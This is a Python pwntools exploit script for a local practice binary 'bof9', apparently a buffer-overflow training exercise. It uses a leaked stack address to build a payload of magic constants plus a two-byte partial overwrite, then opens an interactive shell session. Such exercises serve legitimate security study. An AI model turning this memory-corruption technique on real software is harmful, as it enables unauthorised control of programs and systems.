#!/bin/python3
from pwn import *
exe = ELF('./bof9')

p = process(exe.path)
p.recvuntil(b'new user: ')

stack_leak = int(p.recvline(),16)
rbp_leak = stack_leak - 16
char1_leak = rbp_leak
log.info("Char1 leak: " + hex(char1_leak))
log.info("RBP leak: " + hex(rbp_leak))
log.info("Stack leak: " + hex(stack_leak))
payload = b'' 
payload += p64(0x13371337)
payload += p64(0xDEADBEEF)
payload += p64(0xCAFEBABE)
payload += p64(0)
payload += p64(char1_leak)[0:2]

input()
p.sendlineafter(b'Username:',payload)
p.sendlineafter(b'Password:',b'cdsjcdskcjdskchsdkjchdskc')
p.interactive()

